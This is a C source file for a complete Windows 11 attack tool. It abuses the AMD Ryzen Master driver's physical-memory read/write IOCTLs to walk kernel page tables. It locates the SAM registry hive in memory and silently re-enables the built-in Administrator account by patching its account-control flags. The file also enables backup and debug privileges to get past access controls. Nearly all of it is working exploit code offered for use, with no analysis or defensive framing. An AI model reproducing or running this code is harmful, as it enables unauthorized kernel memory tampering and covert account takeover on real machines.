/*
 * sam_hive.c — SAM hive direct modification via physical R/W (Win11 26200 fixed)
 *
 * Two-phase hive discovery:
 *   Phase 1: Brute-force physical scan (fast, works when hive pages are contiguous)
 *   Phase 2: VA-walk via handle (CM_KEY_BODY → KCB → HHIVE → BaseBlock)
 *             Used as fallback on Win11 24H2+ where pool pages may not be contiguous
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -O2 -Wall -Wno-unused-function \
 *       -o sam_hive.exe sam_hive.c -lkernel32 -ladvapi32
 *
 * Requires: AMDRyzenMasterDriverV20, Admin rights.
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <inttypes.h>

/* ══════════════════════════════════════════════════════════════════════════
 * §1  AMD DRIVER PRIMITIVES
 * ══════════════════════════════════════════════════════════════════════════ */

#define DEVICE_NAME      L"\\\\.\\AMDRyzenMasterDriverV20"
#define IOCTL_PHYS_READ  0x81112F08u
#define IOCTL_PHYS_WRITE 0x81112F0Cu
static HANDLE g_dev = INVALID_HANDLE_VALUE;

#define MAX_RANGES 64
typedef struct { uint64_t base, size; } PhysRange;
static PhysRange g_ranges[MAX_RANGES];
static int       g_nranges = 0;
static uint64_t  g_max_pa  = 0;

static void load_ranges(void)
{
    HKEY h;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory",
            0, KEY_READ, &h) != ERROR_SUCCESS) return;
    char vname[256]; DWORD vn, type;
    uint8_t *buf = NULL; DWORD sz = 0;
    for (DWORD i = 0;; i++) {
        vn = sizeof vname; DWORD vd = 0;
        LONG r = RegEnumValueA(h, i, vname, &vn, NULL, &type, NULL, &vd);
        if (r == ERROR_NO_MORE_ITEMS) break;
        if ((type != 3 && type != 8) || vd < 20) continue;
        buf = malloc(vd); if (!buf) continue;
        if (RegQueryValueExA(h, vname, NULL, NULL, buf, &vd) == ERROR_SUCCESS)
            { sz = vd; break; }
        free(buf); buf = NULL;
    }
    RegCloseKey(h);
    if (!buf || sz < 20) { free(buf); return; }
    DWORD cnt = *(DWORD*)(buf + 16); uint8_t *p = buf + 20;
    for (DWORD i = 0; i < cnt && g_nranges < MAX_RANGES; i++, p += 20) {
        g_ranges[g_nranges].base = *(uint64_t*)(p + 4);
        g_ranges[g_nranges].size = *(uint64_t*)(p + 12);
        uint64_t end = g_ranges[g_nranges].base + g_ranges[g_nranges].size;
        if (end > g_max_pa) g_max_pa = end;
        g_nranges++;
    }
    free(buf);
    if (!g_max_pa) g_max_pa = 0x100000000ULL; /* 4 GB fallback */
}

static int open_dev(void)
{
    g_dev = CreateFileW(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE,
                        FILE_SHARE_READ | FILE_SHARE_WRITE,
                        NULL, OPEN_EXISTING, 0, NULL);
    return g_dev != INVALID_HANDLE_VALUE;
}
static void close_dev(void) { if (g_dev != INVALID_HANDLE_VALUE) CloseHandle(g_dev); }

/* Raw IOCTL — no range check.  The IOCTL itself will fail for invalid PAs. */
static int phys_read_raw(uint64_t pa, void *buf, uint32_t len)
{
    uint8_t in_buf[12]; *(uint64_t*)in_buf = pa; *(uint32_t*)(in_buf+8) = len;
    uint8_t *out_buf = (uint8_t*)malloc(12 + len);
    if (!out_buf) return 0;
    DWORD ret = 0;
    int r = DeviceIoControl(g_dev, IOCTL_PHYS_READ, in_buf, 12,
                            out_buf, 12 + len, &ret, NULL);
    if (r) memcpy(buf, out_buf + 12, len);
    free(out_buf);
    return r;
}

static int phys_write_raw(uint64_t pa, const void *buf, uint32_t len)
{
    uint8_t *in_buf = (uint8_t*)malloc(12 + len); if (!in_buf) return 0;
    *(uint64_t*)in_buf = pa; *(uint32_t*)(in_buf+8) = len;
    memcpy(in_buf + 12, buf, len);
    DWORD ret = 0;
    int r = DeviceIoControl(g_dev, IOCTL_PHYS_WRITE, in_buf, 12+len, NULL, 0, &ret, NULL);
    free(in_buf); return r;
}

/* ══════════════════════════════════════════════════════════════════════════
 * §2  KERNEL VIRTUAL ACCESS
 *
 * Used as fallback when physical scan can't find the hive.
 * Approach: open SAM handle → SystemExtendedHandleInformation → kernel object VA
 *           → walk CM_KEY_BODY→KCB→HHIVE→BaseBlock → get hive kernel VA
 *           → all subsequent hive reads/writes go through kva_read/kva_write
 * ══════════════════════════════════════════════════════════════════════════ */

static uint64_t g_kernel_cr3 = 0;
static uint64_t g_hive_kva   = 0; /* kernel VA of "regf" base block, or 0 = physical mode */

static void enable_debug_priv(void)
{
    HANDLE tok = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &tok)) return;
    TOKEN_PRIVILEGES tp = {1};
    if (LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &tp.Privileges[0].Luid))
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(tok, FALSE, &tp, sizeof tp, NULL, NULL);
    CloseHandle(tok);
}

static void enable_backup_priv(void)
{
    HANDLE tok = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &tok)) return;
    TOKEN_PRIVILEGES tp = {1};
    const char *privs[] = { "SeBackupPrivilege", "SeRestorePrivilege" };
    for (int i = 0; i < 2; i++) {
        if (LookupPrivilegeValueA(NULL, privs[i], &tp.Privileges[0].Luid))
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(tok, FALSE, &tp, sizeof tp, NULL, NULL);
    }
    CloseHandle(tok);
}

/* PID-first System EPROCESS scan → sets g_kernel_cr3 */
static uint64_t find_system_eproc_pa(void)
{
    static uint8_t page[0x1000];
    const int sub_max = 0x1000 - 0x458; /* last field: Blink @ +0x450+7 */
    static const uint32_t name_cands[] = {0x5A8, 0x5B0, 0x5B8, 0x5C0, 0x5A0, 0x5C8};

    for (int ri = 0; ri < g_nranges; ri++) {
        uint64_t rbase = g_ranges[ri].base;
        uint64_t rend  = rbase + g_ranges[ri].size;
        if (rend > 0x20000000) rend = 0x20000000; /* first 512MB */

        for (uint64_t ppa = (rbase + 0xFFF) & ~0xFFFULL;
             ppa + 0x1000 <= rend; ppa += 0x1000) {
            if (!phys_read_raw(ppa, page, 0x1000)) continue;

            for (int sub = 0; sub <= sub_max; sub += 0x10) {
                uint64_t pid = 0; memcpy(&pid, page + sub + 0x440, 8);
                if (pid != 4) continue;

                uint64_t dtb = 0; memcpy(&dtb, page + sub + 0x028, 8);
                if (!dtb || (dtb & 0xFFF) || dtb < 0x10000 || (dtb >> 40)) continue;

                uint64_t flink = 0, blink = 0;
                memcpy(&flink, page + sub + 0x448, 8);
                memcpy(&blink, page + sub + 0x450, 8);
                if ((flink >> 48) != 0xFFFF) continue;
                if ((blink >> 48) != 0xFFFF) continue;

                for (int k = 0; k < 6; k++) {
                    uint8_t nm[7] = {0};
                    uint64_t nm_pa = ppa + sub + name_cands[k];
                    if (!phys_read_raw(nm_pa, nm, 6)) continue;
                    if (memcmp(nm, "System", 6) != 0) continue;

                    g_kernel_cr3 = dtb;
                    printf("  [+] System EPROCESS PA=0x%010llX  CR3=0x%010llX\n",
                           (unsigned long long)(ppa + sub),
                           (unsigned long long)dtb);
                    return ppa + sub;
                }
            }
        }
    }
    return 0;
}

/* 4-level x86-64 page table walk */
static uint64_t kva_to_pa(uint64_t cr3, uint64_t va)
{
    uint64_t e = 0;
    /* PML4 */
    if (!phys_read_raw((cr3 & ~0xFFFULL) | ((va >> 39 & 0x1FF) << 3), &e, 8) || !(e & 1)) return 0;
    /* PDPT */
    if (!phys_read_raw((e & 0x000FFFFFFFFFF000ULL) | ((va >> 30 & 0x1FF) << 3), &e, 8) || !(e & 1)) return 0;
    if (e & 0x80) return (e & 0x000FFFFFC0000000ULL) | (va & 0x3FFFFFFF); /* 1 GB */
    /* PD */
    if (!phys_read_raw((e & 0x000FFFFFFFFFF000ULL) | ((va >> 21 & 0x1FF) << 3), &e, 8) || !(e & 1)) return 0;
    if (e & 0x80) return (e & 0x000FFFFFFFE00000ULL) | (va & 0x1FFFFF);  /* 2 MB */
    /* PT */
    if (!phys_read_raw((e & 0x000FFFFFFFFFF000ULL) | ((va >> 12 & 0x1FF) << 3), &e, 8) || !(e & 1)) return 0;
    return (e & 0x000FFFFFFFFFF000ULL) | (va & 0xFFF);
}

static int kva_read(uint64_t va, void *buf, uint32_t len)
{
    uint8_t *p = (uint8_t*)buf;
    uint32_t done = 0;
    while (done < len) {
        uint32_t page_off = (uint32_t)((va + done) & 0xFFF);
        uint32_t chunk = len - done;
        if (chunk > 0x1000u - page_off) chunk = 0x1000u - page_off;
        uint64_t pa = kva_to_pa(g_kernel_cr3, va + done);
        if (!pa || !phys_read_raw(pa, p + done, chunk)) return 0;
        done += chunk;
    }
    return 1;
}

static int kva_write(uint64_t va, const void *buf, uint32_t len)
{
    const uint8_t *p = (const uint8_t*)buf;
    uint32_t done = 0;
    while (done < len) {
        uint32_t page_off = (uint32_t)((va + done) & 0xFFF);
        uint32_t chunk = len - done;
        if (chunk > 0x1000u - page_off) chunk = 0x1000u - page_off;
        uint64_t pa = kva_to_pa(g_kernel_cr3, va + done);
        if (!pa || !phys_write_raw(pa, p + done, chunk)) return 0;
        done += chunk;
    }
    return 1;
}

/*
 * Open HKLM\SAM with backup privilege, use SystemExtendedHandleInformation
 * to get the kernel CM_KEY_BODY VA, then walk:
 *   CM_KEY_BODY.KeyControlBlock (+0x08 or +0x10)
 *   → CM_KEY_CONTROL_BLOCK.KeyHive  (+0x18 or +0x20 or +0x28)
 *   → HHIVE.BaseBlock               (+0x00)
 *   → "regf" base block VA
 */
static uint64_t find_hive_va_via_handle(void)
{
    typedef LONG (WINAPI *NtQSI_t)(ULONG, PVOID, ULONG, PULONG);

    enable_backup_priv();

    /* Open SAM — backup privilege bypasses ACL */
    HKEY hKey = NULL;
    LONG rc = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SAM",
                            REG_OPTION_BACKUP_RESTORE, KEY_READ, &hKey);
    if (rc != ERROR_SUCCESS) {
        rc = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SAM", 0, KEY_READ, &hKey);
        if (rc != ERROR_SUCCESS) {
            printf("  [-] RegOpenKeyExA(SAM) err=%ld\n", rc);
            return 0;
        }
    }

    ULONG_PTR our_pid = (ULONG_PTR)GetCurrentProcessId();
    ULONG_PTR hval    = (ULONG_PTR)hKey;
    printf("  [*] SAM handle: 0x%llX  PID: %llu\n",
           (unsigned long long)hval, (unsigned long long)our_pid);

    /* SystemExtendedHandleInformation = 0x40 — 64-bit Object pointer */
    typedef struct {
        PVOID       Object;
        ULONG_PTR   UniqueProcessId;
        ULONG_PTR   HandleValue;
        ULONG       GrantedAccess;
        USHORT      CreatorBackTraceIndex;
        USHORT      ObjectTypeIndex;
        ULONG       HandleAttributes;
        ULONG       Reserved;
    } SHI_ENTRY;
    typedef struct { ULONG_PTR NumberOfHandles; ULONG_PTR Reserved; SHI_ENTRY Handles[1]; } SHI;

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    NtQSI_t fn = (NtQSI_t)GetProcAddress(ntdll, "NtQuerySystemInformation");
    if (!fn) { RegCloseKey(hKey); return 0; }

    ULONG sz = 0x10000; SHI *shi = NULL; LONG st;
    do {
        free(shi); shi = (SHI*)malloc(sz *= 2);
        if (!shi) { RegCloseKey(hKey); return 0; }
        st = fn(0x40, shi, sz, NULL);
    } while (st == (LONG)0xC0000004L);

    if (st != 0 || !shi) { free(shi); RegCloseKey(hKey); return 0; }

    uint64_t obj_va = 0;
    for (ULONG_PTR i = 0; i < shi->NumberOfHandles; i++) {
        if (shi->Handles[i].UniqueProcessId == our_pid &&
            shi->Handles[i].HandleValue      == hval) {
            obj_va = (uint64_t)(ULONG_PTR)shi->Handles[i].Object;
            break;
        }
    }
    free(shi); RegCloseKey(hKey);

    if (!obj_va || (obj_va >> 48) != 0xFFFF) {
        printf("  [-] CM_KEY_BODY VA not found (obj=0x%llX)\n",
               (unsigned long long)obj_va);
        return 0;
    }
    printf("  [*] CM_KEY_BODY VA: 0x%016llX\n", (unsigned long long)obj_va);

    /* Validate CM_KEY_BODY type tag "ky02" = 0x6B793032 at +0x00 */
    uint32_t tag = 0;
    kva_read(obj_va, &tag, 4);
    if (tag != 0x6B793032u)
        printf("  [~] CM_KEY_BODY tag=0x%08X (expected 0x6B793032 — continuing)\n", tag);

    /* Try known offsets for CM_KEY_BODY.KeyControlBlock pointer */
    static const uint32_t kcb_offsets[]   = {0x08, 0x10, 0x18, 0x20};
    static const uint32_t hhive_offsets[] = {0x18, 0x20, 0x28, 0x10, 0x30};

    for (int i = 0; i < 4; i++) {
        uint64_t kcb_va = 0;
        if (!kva_read(obj_va + kcb_offsets[i], &kcb_va, 8)) continue;
        if (!kcb_va || (kcb_va >> 48) != 0xFFFF) continue;

        for (int j = 0; j < 5; j++) {
            uint64_t hhive_va = 0;
            if (!kva_read(kcb_va + hhive_offsets[j], &hhive_va, 8)) continue;
            if (!hhive_va || (hhive_va >> 48) != 0xFFFF) continue;

            uint64_t baseblock_va = 0;
            if (!kva_read(hhive_va, &baseblock_va, 8)) continue;
            if (!baseblock_va || (baseblock_va >> 48) != 0xFFFF) continue;

            uint32_t magic = 0;
            if (!kva_read(baseblock_va, &magic, 4)) continue;
            if (magic != 0x66676572u) continue; /* "regf" */

            printf("  [+] Hive base VA: 0x%016llX  "
                   "(kcb_off=+0x%X  hhive_off=+0x%X)\n",
                   (unsigned long long)baseblock_va,
                   kcb_offsets[i], hhive_offsets[j]);
            return baseblock_va;
        }
    }

    printf("  [-] Could not walk CM_KEY_BODY→KCB→HHIVE→BaseBlock\n");
    return 0;
}

/* ══════════════════════════════════════════════════════════════════════════
 * §3  HIVE ABSTRACTION LAYER
 *
 * g_hive_kva != 0  → VA mode: all access via kva_read/kva_write
 * g_hive_kva == 0  → PA mode: all access via phys_read_raw/phys_write_raw
 *
 * hread/hwrite take a hive-relative byte offset (0 = "regf" header).
 * find_value_data_off returns a hive-relative offset (not an absolute PA/VA).
 * ══════════════════════════════════════════════════════════════════════════ */

static uint64_t g_hive_pa = 0; /* used in PA mode */

static int hread(uint64_t hoff, void *buf, uint32_t len)
{
    if (g_hive_kva)
        return kva_read(g_hive_kva + hoff, buf, len);
    return phys_read_raw(g_hive_pa + hoff, buf, len);
}

static int hwrite(uint64_t hoff, const void *buf, uint32_t len)
{
    if (g_hive_kva)
        return kva_write(g_hive_kva + hoff, buf, len);
    return phys_write_raw(g_hive_pa + hoff, buf, len);
}

/* Convert a stable HCELL_INDEX to hive-relative byte offset (past Size field) */
static uint64_t cell_data_off(int32_t idx)
{
    return 0x1000ULL + (uint32_t)(idx & 0x7FFFFFFF) + 4;
}

static uint16_t cell_sig(int32_t idx)
{
    uint16_t s = 0; hread(cell_data_off(idx), &s, 2); return s;
}

/* ══════════════════════════════════════════════════════════════════════════
 * §4  HIVE NAVIGATION: subkey and value lookup  (unchanged logic)
 * ══════════════════════════════════════════════════════════════════════════ */

static int32_t find_subkey(int32_t parent_idx, const char *name)
{
    if (parent_idx < 0) return -1;
    uint64_t base = cell_data_off(parent_idx);
    if (cell_sig(parent_idx) != 0x6E6B) return -1;

    uint32_t sk_count = 0; hread(base + 0x14, &sk_count, 4);
    int32_t  sk_list  = -1; hread(base + 0x1C, &sk_list, 4);
    if (sk_count == 0 || sk_list < 0) return -1;

    uint16_t list_sig = cell_sig(sk_list);
    uint64_t list_base = cell_data_off(sk_list);
    int name_len = (int)strlen(name);

    if (list_sig == 0x666C || list_sig == 0x686C) { /* lf / lh */
        uint16_t count = 0; hread(list_base + 2, &count, 2);
        for (uint16_t i = 0; i < count; i++) {
            int32_t child_idx = -1;
            hread(list_base + 4 + (uint64_t)i * 8, &child_idx, 4);
            if (child_idx < 0) continue;
            uint64_t c = cell_data_off(child_idx);
            uint16_t cname_len = 0; hread(c + 0x38, &cname_len, 2);
            if (cname_len != (uint16_t)name_len) continue;
            char cname[256] = {0};
            hread(c + 0x3C, cname, cname_len < 255 ? cname_len : 255);
            if (_strnicmp(cname, name, name_len) == 0) return child_idx;
        }
    } else if (list_sig == 0x696C) { /* li: plain array */
        uint16_t count = 0; hread(list_base + 2, &count, 2);
        for (uint16_t i = 0; i < count; i++) {
            int32_t child_idx = -1;
            hread(list_base + 4 + (uint64_t)i * 4, &child_idx, 4);
            if (child_idx < 0) continue;
            uint64_t c = cell_data_off(child_idx);
            uint16_t cname_len = 0; hread(c + 0x38, &cname_len, 2);
            if (cname_len != (uint16_t)name_len) continue;
            char cname[256] = {0};
            hread(c + 0x3C, cname, cname_len < 255 ? cname_len : 255);
            if (_strnicmp(cname, name, name_len) == 0) return child_idx;
        }
    } else if (list_sig == 0x6972) { /* ri: indirect list of lists */
        uint16_t ri_count = 0; hread(list_base + 2, &ri_count, 2);
        for (uint16_t ri = 0; ri < ri_count; ri++) {
            int32_t sub_list = -1;
            hread(list_base + 4 + (uint64_t)ri * 4, &sub_list, 4);
            if (sub_list < 0) continue;
            uint16_t sub_sig = cell_sig(sub_list);
            uint64_t sub_base = cell_data_off(sub_list);
            if (sub_sig == 0x666C || sub_sig == 0x686C || sub_sig == 0x696C) {
                uint16_t cnt = 0; hread(sub_base + 2, &cnt, 2);
                uint32_t stride = (sub_sig == 0x696C) ? 4 : 8;
                for (uint16_t j = 0; j < cnt; j++) {
                    int32_t child_idx = -1;
                    hread(sub_base + 4 + (uint64_t)j * stride, &child_idx, 4);
                    if (child_idx < 0) continue;
                    uint64_t c = cell_data_off(child_idx);
                    uint16_t cname_len = 0; hread(c + 0x38, &cname_len, 2);
                    if (cname_len != (uint16_t)name_len) continue;
                    char cname[256] = {0};
                    hread(c + 0x3C, cname, cname_len < 255 ? cname_len : 255);
                    if (_strnicmp(cname, name, name_len) == 0) return child_idx;
                }
            }
        }
    }
    return -1;
}

/*
 * Returns hive-relative byte offset of the data cell content for value 'vname'.
 * For inline (small) data: offset points to the DataOffset field in the vk cell.
 * Sets *data_len_out to the data length.
 * Returns 0 on failure.
 */
static uint64_t find_value_data_hoff(int32_t key_idx, const char *vname,
                                     uint32_t *data_len_out)
{
    if (key_idx < 0) return 0;
    uint64_t kbase = cell_data_off(key_idx);
    if (cell_sig(key_idx) != 0x6E6B) return 0;

    uint32_t val_count = 0; hread(kbase + 0x24, &val_count, 4);
    int32_t  val_list  = -1; hread(kbase + 0x28, &val_list, 4);
    if (val_count == 0 || val_list < 0) return 0;

    int vname_len = (int)strlen(vname);
    for (uint32_t i = 0; i < val_count; i++) {
        int32_t val_idx = -1;
        hread(cell_data_off(val_list) + (uint64_t)i * 4, &val_idx, 4);
        if (val_idx < 0) continue;
        uint64_t v = cell_data_off(val_idx);
        if (cell_sig(val_idx) != 0x6B76) continue;
        uint16_t vlen = 0; hread(v + 2, &vlen, 2);
        if (vlen != (uint16_t)vname_len) continue;
        char vcname[256] = {0};
        hread(v + 0x14, vcname, vlen < 255 ? vlen : 255);
        if (_strnicmp(vcname, vname, vname_len) != 0) continue;

        uint32_t dlen = 0; hread(v + 4, &dlen, 4);
        int32_t  doff = -1; hread(v + 8, &doff, 4);
        if (dlen & 0x80000000) {
            if (data_len_out) *data_len_out = dlen & 0x7FFFFFFF;
            return v + 8; /* hive offset of DataOffset field (contains inline data) */
        }
        if (data_len_out) *data_len_out = dlen;
        return cell_data_off(doff);
    }
    return 0;
}

/* ══════════════════════════════════════════════════════════════════════════
 * §5  SAM HIVE DISCOVERY
 * ══════════════════════════════════════════════════════════════════════════ */

static int try_hive_sam(uint64_t pa)
{
    uint32_t magic = 0;
    if (!phys_read_raw(pa, &magic, 4)) return 0;
    if (magic != 0x66676572u) return 0; /* "regf" */

    g_hive_pa = pa; g_hive_kva = 0; /* PA mode for this check */

    int32_t root_idx = -1;
    hread(0x24, &root_idx, 4);
    if (root_idx < 0 || root_idx > 0x800000) return 0;
    if (cell_sig(root_idx) != 0x6E6B) return 0;

    int32_t sam_idx = find_subkey(root_idx, "SAM");
    return sam_idx >= 0;
}

static uint64_t find_sam_hive_pa(void)
{
    /* Scan from PA 0 to max_pa — no in_range restriction.
     * Covers cases where the hive is physically contiguous but outside
     * the HARDWARE\RESOURCEMAP hint ranges. */
    uint64_t limit = g_max_pa;
    if (limit < 0x40000000ULL) limit = 0x100000000ULL; /* minimum 4 GB */

    printf("[*] Physical scan: 0x00000000 – 0x%010llX\n", (unsigned long long)limit);
    for (uint64_t pa = 0; pa + 0x1000 < limit; pa += 0x1000) {
        if (try_hive_sam(pa)) {
            printf("[+] SAM hive found (physical) at PA: 0x%010llX\n", pa);
            return pa;
        }
    }
    return 0;
}

/* ══════════════════════════════════════════════════════════════════════════
 * §6  MAIN
 *
 * SAM "F" value layout (SAM_USER_ACCOUNT_F):
 *   +0x3C  uint32  UserAccountControl
 *   Bit 0x0002 = ADS_UF_ACCOUNTDISABLE — clear to enable account
 * ══════════════════════════════════════════════════════════════════════════ */

#define F_UAC_OFFSET          0x3Cu
#define ADS_UF_ACCOUNTDISABLE 0x0002u

int main(void)
{
    puts("=== sam_hive: SAM hive physical/VA modification ===");

    if (!open_dev()) { fputs("[-] Cannot open AMD device\n", stderr); return 1; }
    load_ranges();
    if (!g_nranges) { puts("[-] No physical ranges"); close_dev(); return 1; }
    printf("[+] Physical ranges: %d  max_pa=0x%010llX\n",
           g_nranges, (unsigned long long)g_max_pa);

    /* Phase 1: physical scan */
    uint64_t sam_pa = find_sam_hive_pa();

    if (!sam_pa) {
        puts("[*] Physical scan failed — trying VA path via handle");

        /* Need kernel CR3 for page table walking */
        enable_debug_priv();
        if (!find_system_eproc_pa()) {
            puts("[-] Could not find System EPROCESS (no CR3)");
            close_dev(); return 1;
        }
        printf("[+] Kernel CR3: 0x%010llX\n", (unsigned long long)g_kernel_cr3);

        g_hive_kva = find_hive_va_via_handle();
        if (!g_hive_kva) {
            puts("[-] VA path also failed — SAM hive not found");
            close_dev(); return 1;
        }
        puts("[+] Using kernel VA mode for hive access");
    }

    /* At this point either:
     *   PA mode: g_hive_pa set, g_hive_kva == 0
     *   VA mode: g_hive_kva set (g_hive_pa irrelevant) */

    /* Navigate: root → SAM → Domains → Account → Users → 000001F4 */
    int32_t root_idx = -1; hread(0x24, &root_idx, 4);
    printf("[+] Root cell index: 0x%X\n", (unsigned)root_idx);

    const char *path[] = { "SAM", "Domains", "Account", "Users", "000001F4" };
    int32_t cur = root_idx;
    for (int i = 0; i < 5; i++) {
        int32_t next = find_subkey(cur, path[i]);
        if (next < 0) {
            printf("[-] Key '%s' not found\n", path[i]);
            close_dev(); return 1;
        }
        printf("[+] Found '%s' → cell 0x%X\n", path[i], (unsigned)next);
        cur = next;
    }

    /* Find "F" value */
    uint32_t f_len = 0;
    uint64_t f_hoff = find_value_data_hoff(cur, "F", &f_len);
    if (!f_hoff) { puts("[-] 'F' value not found"); close_dev(); return 1; }
    printf("[+] 'F' data hive-offset=0x%llX  len=%u\n",
           (unsigned long long)f_hoff, f_len);

    if (f_len < F_UAC_OFFSET + 4) {
        printf("[-] 'F' value too short (%u bytes)\n", f_len);
        close_dev(); return 1;
    }

    /* Read F blob */
    uint8_t f_blob[0x50] = {0};
    uint32_t read_len = f_len < sizeof(f_blob) ? f_len : sizeof(f_blob);
    hread(f_hoff, f_blob, read_len);

    uint16_t revision = *(uint16_t*)(f_blob + 0x00);
    uint32_t uid      = *(uint32_t*)(f_blob + 0x34);
    uint32_t uac      = *(uint32_t*)(f_blob + F_UAC_OFFSET);

    printf("[+] F blob: revision=%u  UserId=0x%08X  UAC=0x%08X\n",
           revision, uid, uac);

    if (uid != 0x1F4) {
        uint32_t uac2 = *(uint32_t*)(f_blob + 0x38);
        printf("[~] UserId mismatch (0x%X) — trying UAC at +0x38: 0x%08X\n", uid, uac2);
        if (uac2 & 0x0200) {
            printf("[~] Using +0x38 for UAC\n");
            uac = uac2;
            /* write directly at the shifted offset — don't touch f_hoff */
            uint32_t uac2_new = uac2 & ~ADS_UF_ACCOUNTDISABLE;
            printf("[*] Patching UAC at +0x38: 0x%08X → 0x%08X\n", uac2, uac2_new);
            if (!hwrite(f_hoff + 0x38, &uac2_new, 4)) {
                puts("[-] hwrite failed"); close_dev(); return 1;
            }
            uint32_t chk = 0; hread(f_hoff + 0x38, &chk, 4);
            if (chk == uac2_new)
                printf("[+] SUCCESS: Administrator ENABLED (UAC=0x%08X)\n", chk);
            else
                printf("[-] Verify failed at +0x38\n");
            close_dev(); return (chk == uac2_new) ? 0 : 1;
        } else {
            printf("[!] Cannot verify Administrator entry (uid=0x%X)\n", uid);
            close_dev(); return 1;
        }
    }

    if (!(uac & ADS_UF_ACCOUNTDISABLE)) {
        printf("[+] Administrator already ENABLED (UAC=0x%08X)\n", uac);
        close_dev(); return 0;
    }

    uint32_t uac_new = uac & ~ADS_UF_ACCOUNTDISABLE;
    printf("[*] Patching UAC: 0x%08X → 0x%08X\n", uac, uac_new);

    if (!hwrite(f_hoff + F_UAC_OFFSET, &uac_new, 4)) {
        puts("[-] hwrite failed"); close_dev(); return 1;
    }

    /* Verify */
    uint32_t uac_check = 0;
    hread(f_hoff + F_UAC_OFFSET, &uac_check, 4);
    if (uac_check == uac_new) {
        printf("[+] SUCCESS: Administrator ENABLED (UAC=0x%08X)\n", uac_check);
        puts("[+] Login: runas /user:Administrator cmd");
    } else {
        printf("[-] Verify failed: read 0x%08X expected 0x%08X\n", uac_check, uac_new);
        close_dev(); return 1;
    }

    close_dev();
    return 0;
}
